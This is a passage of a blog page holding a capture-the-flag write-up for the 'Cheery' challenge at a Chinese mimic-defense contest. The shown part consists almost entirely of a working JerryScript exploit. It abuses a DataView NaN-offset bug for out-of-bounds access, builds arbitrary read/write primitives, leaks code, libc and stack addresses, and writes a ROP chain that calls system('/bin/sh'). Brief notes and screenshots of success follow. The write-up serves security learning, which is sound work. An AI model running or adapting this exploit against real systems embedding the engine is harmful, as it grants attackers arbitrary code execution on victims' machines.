class="hljs-string">&quot;[*] GC initiated&quot;</span>);<br>    <br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">200</span>; i++) &#123;<br>        grooming.<span class="hljs-title function_">push</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x100</span>));<br>    &#125;<br>    <span class="hljs-title function_">print</span>(<span class="hljs-string">&quot;[*] GC completed&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">spin</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) &#123;&#125;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">inin_dv</span>(<span class="hljs-params">arr,arr_length,ab_length</span>)&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>; i&lt;arr_length; i++) &#123;<br>        arr.<span class="hljs-title function_">push</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">DataView</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(ab_length)));<br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>; i&lt;arr_length; i++) &#123;<br>        arr[i].<span class="hljs-title function_">setFloat64</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_">u64_to_f64</span>(<span class="hljs-title class_">MagicSign</span>), <span class="hljs-literal">true</span>); <br>    &#125;<br>    <span class="hljs-keyword">return</span> arr;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getType</span>(<span class="hljs-params">val</span>)&#123;<br>    <span class="hljs-keyword">return</span> (val) &amp; <span class="hljs-number">0xffn</span>;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getByteLength</span>(<span class="hljs-params">val</span>)&#123;<br>    <span class="hljs-keyword">return</span> (val &gt;&gt; <span class="hljs-number">32n</span>) &amp; <span class="hljs-number">0xffffffffn</span>;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getProtoType</span>(<span class="hljs-params">val</span>)&#123;<br>    <span class="hljs-keyword">return</span> (val) &amp; <span class="hljs-number">0xffffffffn</span>;<br>&#125;<br><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">find_victim_ab_idx</span>(<span class="hljs-params">oob_dv,feature</span>)&#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">let feature = [0x940000200c0012n,0x100000000319n];</span><br><span class="hljs-comment">pwndbg&gt; x/4wx 0x57086ef86300</span><br><span class="hljs-comment">0x57086ef86300 &lt;jerry_global_heap+65664&gt;:  0x200c0012  0x00940000  0x00000319  0x00001000</span><br><span class="hljs-comment">pwndbg&gt; x/4wx 0x57086ef86340</span><br><span class="hljs-comment">0x57086ef86340 &lt;jerry_global_heap+65728&gt;:  0x20140012  0x00940000  0x00000319  0x00001000</span><br><span class="hljs-comment">pwndbg&gt; </span><br><span class="hljs-comment">*/</span><br><br>    <span class="hljs-title function_">print</span>(<span class="hljs-string">&quot;[*] find_victim_ab_idx&quot;</span>);<br>    <span class="hljs-keyword">let</span> <span class="hljs-title class_">Types</span> = <span class="hljs-title function_">getType</span>(feature[<span class="hljs-number">0</span>]);<br>    <span class="hljs-keyword">let</span> <span class="hljs-title class_">ProtoType</span> = <span class="hljs-title function_">getProtoType</span>(feature[<span class="hljs-number">1</span>]);<br>    <span class="hljs-keyword">let</span> <span class="hljs-title class_">ByteLength</span> = <span class="hljs-title function_">getByteLength</span>(feature[<span class="hljs-number">1</span>]);<br><br>    <span class="hljs-keyword">let</span> val = [];<br>    <br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x5000</span>; i++) &#123;<br>        val[<span class="hljs-number">0</span>] = <span class="hljs-title function_">f64_to_u64</span>(oob_dv.<span class="hljs-title function_">getFloat64</span>(i*<span class="hljs-number">8</span>, <span class="hljs-literal">true</span>));<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_">getType</span>(val[<span class="hljs-number">0</span>]) == <span class="hljs-title class_">Types</span>)&#123;<br>            val[<span class="hljs-number">1</span>] = <span class="hljs-title function_">f64_to_u64</span>(oob_dv.<span class="hljs-title function_">getFloat64</span>((i+<span class="hljs-number">1</span>)*<span class="hljs-number">8</span>, <span class="hljs-literal">true</span>));<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_">getProtoType</span>(val[<span class="hljs-number">1</span>]) == <span class="hljs-title class_">ProtoType</span> &amp;&amp; <span class="hljs-title function_">getByteLength</span>(val[<span class="hljs-number">1</span>]) == <span class="hljs-title class_">ByteLength</span>)&#123;<br>                target_idx = i + <span class="hljs-number">2</span>;<br>                <span class="hljs-title function_">logg</span>(<span class="hljs-string">&quot;target_idx: &quot;</span>,target_idx);<br>                <span class="hljs-keyword">return</span> target_idx;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">find_corrupt_dv</span>(<span class="hljs-params">oob_dv, dv_arr</span>)&#123;<br>    <span class="hljs-title function_">print</span>(<span class="hljs-string">&quot;[*] find_corrupt_dv&quot;</span>);<br>    <span class="hljs-keyword">let</span> len_offset = (target_idx -<span class="hljs-number">1</span> ) * <span class="hljs-number">8</span> + <span class="hljs-number">4</span>;<br>    <span class="hljs-keyword">let</span> maigc = <span class="hljs-number">0x41414141</span>;<br>    <span class="hljs-keyword">let</span> original_length = (oob_dv.<span class="hljs-title function_">getUint32</span>(len_offset, <span class="hljs-literal">true</span>));<br>    <span class="hljs-title function_">logg</span>(<span class="hljs-string">&quot;original length: &quot;</span>, original_length);<br><br>    oob_dv.<span class="hljs-title function_">setUint32</span>(len_offset, maigc, <span class="hljs-literal">true</span>);<br><br>    <span class="hljs-keyword">let</span> length = -<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>; i&lt;dv_arr.<span class="hljs-property">length</span>; i++)&#123;<br>        length = dv_arr[i].<span class="hljs-property">buffer</span>.<span class="hljs-property">byteLength</span>;<br>        <span class="hljs-comment">// print(&quot;length: 0x&quot; + length.toString(16));</span><br>        <span class="hljs-keyword">if</span>(length == maigc)&#123;<br>            <span class="hljs-title function_">logg</span>(<span class="hljs-string">&quot;Found corrupted dv at index: &quot;</span>, i);<br>            oob_dv.<span class="hljs-title function_">setUint32</span>(len_offset, original_length, <span class="hljs-literal">true</span>);<br>            <span class="hljs-keyword">return</span> i;<br>        &#125;<br>    &#125;   <br>    <span class="hljs-title function_">print</span>(<span class="hljs-string">&quot;[-] Failed to find corrupted dv&quot;</span>);<br>    <span class="hljs-keyword">return</span> -<span class="hljs-number">1</span>;<br>&#125;<br><br><br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">read64</span>(<span class="hljs-params">addr</span>)&#123;<br>    <span class="hljs-keyword">let</span> lo = -<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">let</span> hi = -<span class="hljs-number">1</span>;<br><br>    <span class="hljs-keyword">let</span> orig = <span class="hljs-title function_">f64_to_u64</span>(dv.<span class="hljs-title function_">getFloat64</span>(target_idx * <span class="hljs-number">8</span>, <span class="hljs-literal">true</span>));<br>    <span class="hljs-comment">// print(&quot;orig: 0x&quot; + orig.toString(16));</span><br><br>    dv.<span class="hljs-title function_">setUint32</span>(target_idx * <span class="hljs-number">8</span>, <span class="hljs-title class_">Number</span>(addr &amp; <span class="hljs-number">0xffffffffn</span>), <span class="hljs-literal">true</span>);<br>    dv.<span class="hljs-title function_">setUint32</span>(target_idx * <span class="hljs-number">8</span> + <span class="hljs-number">4</span>, <span class="hljs-title class_">Number</span>((addr &gt;&gt; <span class="hljs-number">32n</span>) &amp; <span class="hljs-number">0xffffffffn</span>), <span class="hljs-literal">true</span>);<br>    <br>    lo = vic_dv_array[corrupt_idx].<span class="hljs-title function_">getUint32</span>(<span class="hljs-number">0</span>, <span class="hljs-literal">true</span>);<br>    hi = vic_dv_array[corrupt_idx].<span class="hljs-title function_">getUint32</span>(<span class="hljs-number">4</span>, <span class="hljs-literal">true</span>);<br>    <br>    <span class="hljs-keyword">let</span> ret = (<span class="hljs-title class_">BigInt</span>(hi) &lt;&lt; <span class="hljs-number">32n</span>) | <span class="hljs-title class_">BigInt</span>(lo);<br><br>    dv.<span class="hljs-title function_">setFloat64</span>(target_idx * <span class="hljs-number">8</span>, <span class="hljs-title function_">u64_to_f64</span>(orig), <span class="hljs-literal">true</span>);<br><br>    <span class="hljs-comment">// print(&quot;orig: 0x&quot; + orig.toString(16));</span><br>    <span class="hljs-keyword">return</span> ret;<br>    <br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">write32</span>(<span class="hljs-params">addr, value</span>)&#123;<br>    <span class="hljs-keyword">let</span> lo = -<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">let</span> hi = -<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">let</span> orig = <span class="hljs-title function_">f64_to_u64</span>(dv.<span class="hljs-title function_">getFloat64</span>(target_idx * <span class="hljs-number">8</span>, <span class="hljs-literal">true</span>));<br><br>    dv.<span class="hljs-title function_">setUint32</span>(target_idx * <span class="hljs-number">8</span>, <span class="hljs-title class_">Number</span>(addr &amp; <span class="hljs-number">0xffffffffn</span>), <span class="hljs-literal">true</span>);<br>    dv.<span class="hljs-title function_">setUint32</span>(target_idx * <span class="hljs-number">8</span> + <span class="hljs-number">4</span>, <span class="hljs-title class_">Number</span>((addr &gt;&gt; <span class="hljs-number">32n</span>) &amp; <span class="hljs-number">0xffffffffn</span>), <span class="hljs-literal">true</span>);<br>    <br>    vic_dv_array[corrupt_idx].<span class="hljs-title function_">setUint32</span>(<span class="hljs-number">0</span>, <span class="hljs-title class_">Number</span>(value &amp; <span class="hljs-number">0xffffffffn</span>), <span class="hljs-literal">true</span>);<br><br>    dv.<span class="hljs-title function_">setFloat64</span>(target_idx * <span class="hljs-number">8</span>, <span class="hljs-title function_">u64_to_f64</span>(orig), <span class="hljs-literal">true</span>);<br>    <br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">write64</span>(<span class="hljs-params">addr, value</span>)&#123;<br>    <span class="hljs-keyword">let</span> lo = -<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">let</span> hi = -<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">let</span> orig = <span class="hljs-title function_">f64_to_u64</span>(dv.<span class="hljs-title function_">getFloat64</span>(target_idx * <span class="hljs-number">8</span>, <span class="hljs-literal">true</span>));<br><br>    dv.<span class="hljs-title function_">setUint32</span>(target_idx * <span class="hljs-number">8</span>, <span class="hljs-title class_">Number</span>(addr &amp; <span class="hljs-number">0xffffffffn</span>), <span class="hljs-literal">true</span>);<br>    dv.<span class="hljs-title function_">setUint32</span>(target_idx * <span class="hljs-number">8</span> + <span class="hljs-number">4</span>, <span class="hljs-title class_">Number</span>((addr &gt;&gt; <span class="hljs-number">32n</span>) &amp; <span class="hljs-number">0xffffffffn</span>), <span class="hljs-literal">true</span>);<br>    <br>    vic_dv_array[corrupt_idx].<span class="hljs-title function_">setUint32</span>(<span class="hljs-number">0</span>, <span class="hljs-title class_">Number</span>(value &amp; <span class="hljs-number">0xffffffffn</span>), <span class="hljs-literal">true</span>);<br>    vic_dv_array[corrupt_idx].<span class="hljs-title function_">setUint32</span>(<span class="hljs-number">4</span>, <span class="hljs-title class_">Number</span>((value &gt;&gt; <span class="hljs-number">32n</span>) &amp; <span class="hljs-number">0xffffffffn</span>), <span class="hljs-literal">true</span>);<br><br>    dv.<span class="hljs-title function_">setFloat64</span>(target_idx * <span class="hljs-number">8</span>, <span class="hljs-title function_">u64_to_f64</span>(orig), <span class="hljs-literal">true</span>);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">TestPrimitive</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-title function_">print</span>(<span class="hljs-string">&quot;[*] TestPrimitive&quot;</span>);<br>    <span class="hljs-keyword">let</span> orig = <span class="hljs-title function_">read64</span>(heap_global_addr);<br>    <span class="hljs-title function_">logg</span>(<span class="hljs-string">&quot;orig: &quot;</span>, orig);<br>    <br>    <span class="hljs-title function_">write64</span>(heap_global_addr, <span class="hljs-number">0x4444444444444444n</span>);<br>    <br>    <span class="hljs-keyword">let</span> new_val = <span class="hljs-title function_">read64</span>(heap_global_addr);<br>    <span class="hljs-title function_">logg</span>(<span class="hljs-string">&quot;new_val: &quot;</span>, new_val);<br>    <span class="hljs-title function_">print</span>(<span class="hljs-string">&quot;[*] TestPrimitive completed&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">MakeRef</span>(<span class="hljs-params"></span>)&#123;<br>    <span class="hljs-keyword">return</span> [vic_dv_array];<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">InitExploit</span>(<span class="hljs-params">version</span>)&#123;<br>    <span class="hljs-title function_">print</span>(<span class="hljs-string">&quot;[*] InitExploit&quot;</span>);<br>    <span class="hljs-keyword">if</span> (version == <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-comment">// 题目下发版本</span><br>        <span class="hljs-keyword">return</span> [<br>            <span class="hljs-number">0x78n</span>,   <span class="hljs-comment">// handler_offset</span><br>            <span class="hljs-number">0x5648fn</span>,   <span class="hljs-comment">// code_offset</span><br>            <span class="hljs-number">0x70de0n</span>,   <span class="hljs-comment">// got_offset</span><br>            <span class="hljs-number">0x86710n</span>,   <span class="hljs-comment">// libc_offset</span><br>            <span class="hljs-number">0x20ad58n</span>,<br>            <span class="hljs-number">0x58750n</span>,<br>        ];<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">// 自己编译版本</span><br>        <span class="hljs-keyword">return</span> [<br>            <span class="hljs-number">0x158n</span>,   <span class="hljs-comment">// handler_offset</span><br>            <span class="hljs-number">0xd0815n</span>,   <span class="hljs-comment">// code_offset</span><br>            <span class="hljs-number">0x11add0n</span>,  <span class="hljs-comment">// got_offset</span><br>            <span class="hljs-number">0x606f0n</span>,   <span class="hljs-comment">// libc_offset</span><br>            <span class="hljs-number">0x3f3000n</span>,<br>            <span class="hljs-number">0n</span>,<br>        ];<br>    &#125;<br><br>&#125;<br><br><span class="hljs-title function_">gc</span>();<br><br><span class="hljs-keyword">let</span> <span class="hljs-title class_">InitSign</span> = <span class="hljs-number">0x1111111111111111n</span>;<br><span class="hljs-keyword">let</span> <span class="hljs-title class_">MagicSign</span> = <span class="hljs-number">0x4141414142424242n</span>;<br><span class="hljs-keyword">let</span> confuse_length = <span class="hljs-number">0xffffffff</span>;<br><span class="hljs-keyword">let</span> target_idx = <span class="hljs-number">0x130</span>;<br><br><br><span class="hljs-keyword">let</span> ab_array = [];<br><span class="hljs-keyword">for</span>(<span class="hljs-keyword">let</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">10</span>; i++) ab_array.<span class="hljs-title function_">push</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">0x20</span>));<br><span class="hljs-keyword">let</span> ab = ab_array[<span class="hljs-number">9</span>];<br><br><span class="hljs-keyword">let</span> dv = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataView</span>(ab, <span class="hljs-title class_">NaN</span>, confuse_length);<br>dv.<span class="hljs-title function_">setFloat64</span>(<span class="hljs-number">0</span>, <span class="hljs-title function_">u64_to_f64</span>(<span class="hljs-title class_">InitSign</span>), <span class="hljs-literal">true</span>); <br><br><br><br><span class="hljs-keyword">let</span> vic_dv_array = []<br>vic_dv_array = <span class="hljs-title function_">inin_dv</span>(vic_dv_array ,<span class="hljs-number">100</span> ,<span class="hljs-number">0x1000</span>);<br><br>target_idx = <span class="hljs-title function_">find_victim_ab_idx</span>(dv, [<span class="hljs-number">0x940000200c0012n</span>,<span class="hljs-number">0x100000000319n</span>]);<br><br><span class="hljs-comment">// describe(dv);</span><br><span class="hljs-comment">// describe(vic_dv_array[99]);</span><br><br><span class="hljs-keyword">let</span> ptr_lo = dv.<span class="hljs-title function_">getUint32</span>(target_idx * <span class="hljs-number">8</span>, <span class="hljs-literal">true</span>);<br><span class="hljs-keyword">let</span> ptr_hi = dv.<span class="hljs-title function_">getUint32</span>(target_idx * <span class="hljs-number">8</span> + <span class="hljs-number">4</span>, <span class="hljs-literal">true</span>);<br><span class="hljs-keyword">let</span> heap_global_addr = (<span class="hljs-title class_">BigInt</span>(ptr_hi) &lt;&lt; <span class="hljs-number">32n</span>) | <span class="hljs-title class_">BigInt</span>(ptr_lo);<br>heap_global_addr = heap_global_addr - <span class="hljs-number">0x11058n</span>;<br>heap_global_addr = heap_global_addr &amp; ~ <span class="hljs-number">0xfffn</span>;<br><br><br><span class="hljs-comment">// // 题目下发版本的偏移</span><br>heap_global_addr = heap_global_addr + <span class="hljs-number">0x280n</span>;<br><span class="hljs-comment">// heap_global_addr = heap_global_addr - 0x9000n + 0x280n;</span><br><br><span class="hljs-title function_">logg</span>(<span class="hljs-string">&quot;heap_global_addr: &quot;</span>, heap_global_addr);<br><br><br><span class="hljs-keyword">let</span> corrupt_idx = <span class="hljs-title function_">find_corrupt_dv</span>(dv, vic_dv_array);<br><br><span class="hljs-keyword">let</span> keep_alive = <span class="hljs-title class_">MakeRef</span>();<br><br><span class="hljs-keyword">let</span> version = <span class="hljs-number">1</span>; <span class="hljs-comment">// 0: 自己编译版本, 1: 题目下发版本</span><br><br><span class="hljs-keyword">let</span> [handler_offset,code_offset, got_offset, libc_offset,<br>    environ_offset,system_offset] = <span class="hljs-title class_">InitExploit</span>(version);<br><br><span class="hljs-keyword">let</span> code_base = <span class="hljs-title function_">read64</span>(heap_global_addr+handler_offset)-code_offset;<br><br><br><span class="hljs-keyword">let</span> got_func = code_base + got_offset;<br><span class="hljs-keyword">let</span> libc_base = <span class="hljs-title function_">read64</span>(got_func)-libc_offset;<br><span class="hljs-keyword">let</span> system = libc_base + system_offset;<br><span class="hljs-keyword">let</span> environ_addr = libc_base + environ_offset;<br><br><br><span class="hljs-keyword">let</span> stack = <span class="hljs-title function_">read64</span>(environ_addr)-<span class="hljs-number">0x138n</span>;<br><br><span class="hljs-keyword">let</span> ret = code_base + <span class="hljs-number">0x0002552en</span>;<br><span class="hljs-keyword">let</span> pop_rdi_ret = code_base + <span class="hljs-number">0x00059279n</span>;<br><span class="hljs-keyword">let</span> pop_rsi_ret = code_base + <span class="hljs-number">0x000595d6n</span>;<br><span class="hljs-keyword">let</span> pop_rdx_ret = code_base + <span class="hljs-number">0x00056f1dn</span>;<br><span class="hljs-keyword">let</span> binsh = libc_base + <span class="hljs-number">0x1cb42fn</span>;<br><br><br><span class="hljs-title function_">logg</span>(<span class="hljs-string">&quot;pop_rdi_ret: &quot;</span>, pop_rdi_ret);<br><span class="hljs-title function_">logg</span>(<span class="hljs-string">&quot;pop_rsi_ret: &quot;</span>, pop_rsi_ret);<br><span class="hljs-title function_">logg</span>(<span class="hljs-string">&quot;pop_rdx_ret: &quot;</span>, pop_rdx_ret);<br><span class="hljs-title function_">logg</span>(<span class="hljs-string">&quot;binsh: &quot;</span>, binsh);<br><span class="hljs-title function_">logg</span>(<span class="hljs-string">&quot;system: &quot;</span>, system);<br><br><span class="hljs-title function_">logg</span>(<span class="hljs-string">&quot;code_base: &quot;</span>, code_base);<br><span class="hljs-title function_">logg</span>(<span class="hljs-string">&quot;got_func: &quot;</span>, got_func);<br><span class="hljs-title function_">logg</span>(<span class="hljs-string">&quot;libc_base: &quot;</span>, libc_base);<br><span class="hljs-title function_">logg</span>(<span class="hljs-string">&quot;environ_addr: &quot;</span>, environ_addr);<br><span class="hljs-title function_">logg</span>(<span class="hljs-string">&quot;stack: &quot;</span>, stack);<br><br><span class="hljs-title function_">write64</span>(stack, ret);<br><span class="hljs-title function_">write64</span>(stack+<span class="hljs-number">8n</span>, pop_rdi_ret);<br><span class="hljs-title function_">write64</span>(stack+<span class="hljs-number">16n</span>, binsh);<br><span class="hljs-title function_">write64</span>(stack+<span class="hljs-number">24n</span>, pop_rsi_ret);<br><span class="hljs-title function_">write64</span>(stack+<span class="hljs-number">32n</span>, <span class="hljs-number">0n</span>);<br><span class="hljs-title function_">write64</span>(stack+<span class="hljs-number">40n</span>, pop_rdx_ret);<br><span class="hljs-title function_">write64</span>(stack+<span class="hljs-number">48n</span>, <span class="hljs-number">0n</span>);<br><span class="hljs-title function_">write64</span>(stack+<span class="hljs-number">56n</span>, system);<br><span class="hljs-title function_">write64</span>(stack+<span class="hljs-number">64n</span>, <span class="hljs-number">0n</span>);<br><br><span class="hljs-comment">// TestPrimitive();</span><br><br><span class="hljs-comment">// spin();</span><br></code></pre></td></tr></table></figure>
+
+
+<p>本地测试时堆地址会在这两个之前变化，一个没打通试另外一个就可以了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/mimic_final_cheery/image_dcYm7YjFPF.png" srcset="/img/loading.gif" lazyload></p>
+<p>成功则会有如下显示</p>
+<p><img src="https://cdn.jsdelivr.net/gh/f1lyyy/blog_photo@main/mimic_final_cheery/image_Cm--rpHEEu.png" srcset="/img/loading.gif" lazyload></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Writeup/" class="category-chain-item">Writeup</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Jerryscript/" class="print-no-link">#Jerryscript</a>
+      
+        <a href="/tags/NaN-bug/" class="print-no-link">#NaN bug</a>
+      
+        <a href="/tags/JS-engine/" class="print-no-link">#JS engine</a>
+      
+        <a href="/tags/heap-spray/" class="print-no-link">#heap spray</a>
+      
+        <a href="/tags/gc/" class="print-no-link">#gc</a>
+      
+        <a href="/tags/memory-corrupt/" class="print-no-link">#memory corrupt</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>第八届“强网”拟态防御国际精英挑战赛 - Cheery</div>
+      <div>https://flyyy.top/2025/12/03/mimic_final_cheery/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>Author</div>
+          <div>flyyy</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>Posted on</div>
+          <div>December 3, 2025</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>Licensed under</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - Attribution">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/11/17/rctf-2025-no_check_WASM/" title="RCTF 2025 - no_check_WASM">
+                        <span class="hidden-mobile">RCTF 2025 - no_check_WASM</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>Table of Contents</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">Keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+    <!-- 备案信息 ICP for China -->
+    <div class="beian">
+  <span>
+    <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+      苏ICP备2024115526号
+    </a>
+  </span>
+  
+    
+      <span>
+        <a
+          href="http://www.beian.gov.cn/portal/registerSystemInfo?recordcode=32080302000199"
+          rel="nofollow noopener"
+          class="beian-police"
+          target="_blank"
+        >
+          
+            <span style="visibility: hidden; width: 0">|</span>
+            <img src="/img/police_beian.png" srcset="/img/loading.gif" lazyload alt="police-icon"/>
+          
+          <span>苏公网安备32080302000199号</span>
+        </a>
+      </span>
+    
+  
+</div>
+
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
